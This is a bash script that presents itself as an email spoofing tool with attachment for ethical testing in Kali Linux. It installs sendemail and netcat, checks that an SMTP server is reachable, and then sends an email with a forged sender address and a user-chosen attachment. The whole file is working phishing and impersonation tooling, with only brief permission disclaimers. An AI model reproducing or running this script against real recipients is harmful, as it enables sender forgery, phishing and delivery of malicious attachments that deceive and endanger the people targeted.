#!/bin/bash

# Email Spoofing Script with Attachment for Ethical Testing in Kali Linux
# Requires sendemail, netcat (nc), and valid SMTP credentials
# Usage: chmod +x spoof_email_with_attachment.sh && ./spoof_email_with_attachment.sh
# WARNING: Use only with explicit permission in controlled environments

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Log file for debugging
LOGFILE="/tmp/spoof_email.log"

# Function to check if sendemail is installed
check_sendemail() {
    if ! command -v sendemail &> /dev/null; then
        echo -e "${RED}sendemail not found. Installing...${NC}"
        sudo apt update && sudo apt install -y sendemail libio-socket-ssl-perl libnet-ssleay-perl || {
            echo -e "${RED}Failed to install sendemail. Exiting.${NC}"
            exit 1
        }
    fi
}

# Function to check if netcat is installed
check_nc() {
    if ! command -v nc &> /dev/null; then
        echo -e "${RED}nc (netcat) not found. Installing...${NC}"
        sudo apt update && sudo apt install -y netcat || {
            echo -e "${RED}Failed to install netcat. Exiting.${NC}"
            exit 1
        }
    fi
}

# Function to test SMTP server connectivity
test_smtp() {
    local server=$1
    local port=$2
    echo -e "${GREEN}Testing SMTP connection to $server:$port...${NC}"
    nc -zvw5 "$server" "$port" &> /tmp/smtp_test.log
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}SMTP server is reachable!${NC}"
    else
        echo -e "${RED}Failed to reach SMTP server. Check /tmp/smtp_test.log for details.${NC}"
        exit 1
    fi
}

# Function to validate file existence
check_file() {
    local file=$1
    if [ ! -f "$file" ]; then
        echo -e "${RED}Error: File $file does not exist or is not a regular file!${NC}"
        exit 1
    fi
    if [ ! -r "$file" ]; then
        echo -e "${RED}Error: File $file is not readable. Check permissions.${NC}"
        exit 1
    fi
}

# Function to send the spoofed email with attachment
send_spoofed_email() {
    local from="$1"
    local to="$2"
    local subject="$3"
    local message="$4"
    local smtp_server="$5"
    local smtp_port="$6"
    local smtp_user="$7"
    local smtp_pass="$8"
    local attachment="$9"

    echo -e "${GREEN}Sending spoofed email...${NC}"

    sendemail -f "$from" \
              -t "$to" \
              -u "$subject" \
              -m "$message" \
              -s "$smtp_server:$smtp_port" \
              -xu "$smtp_user" \
              -xp "$smtp_pass" \
              -a "$attachment" \
              -o tls=auto \
              -o message-charset=utf-8 \
              -o logfile="$LOGFILE" &> /tmp/sendemail_output.log

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Email sent successfully!${NC}"
        echo "Log saved to: $LOGFILE"
    else
        echo -e "${RED}Failed to send email. Check /tmp/sendemail_output.log for errors.${NC}"
        exit 1
    fi
}

# ===========================
# Main Script Starts Here
# ===========================

echo -e "${GREEN}=== Email Spoofing Tool with Attachment (Ethical Testing Only) ===${NC}"
echo "⚠️  Use this tool only with permission, in lab or test environments."

# Check dependencies
check_sendemail
check_nc

# Collect user input
read -p "Enter fake sender email (e.g., fake@domain.com): " FROM
read -p "Enter recipient email: " TO
read -p "Enter email subject: " SUBJECT
read -p "Enter email body: " MESSAGE
read -p "Enter path to attachment file (e.g., /home/user/file.pdf): " ATTACHMENT
read -p "Enter SMTP server (e.g., smtp.gmail.com): " SMTP_SERVER
read -p "Enter SMTP port (e.g., 587): " SMTP_PORT
read -p "Enter SMTP username: " SMTP_USER
read -sp "Enter SMTP password: " SMTP_PASS
echo

# Validate inputs
if [[ -z "$FROM" || -z "$TO" || -z "$SUBJECT" || -z "$MESSAGE" || -z "$ATTACHMENT" || -z "$SMTP_SERVER" || -z "$SMTP_PORT" || -z "$SMTP_USER" || -z "$SMTP_PASS" ]]; then
    echo -e "${RED}Error: All fields are required!${NC}"
    exit 1
fi

# Check file
check_file "$ATTACHMENT"

# Test SMTP connectivity
test_smtp "$SMTP_SERVER" "$SMTP_PORT"

# Send spoofed email
send_spoofed_email "$FROM" "$TO" "$SUBJECT" "$MESSAGE" "$SMTP_SERVER" "$SMTP_PORT" "$SMTP_USER" "$SMTP_PASS" "$ATTACHMENT"

echo -e "${GREEN}Done. Check the recipient inbox (or spam).${NC}"
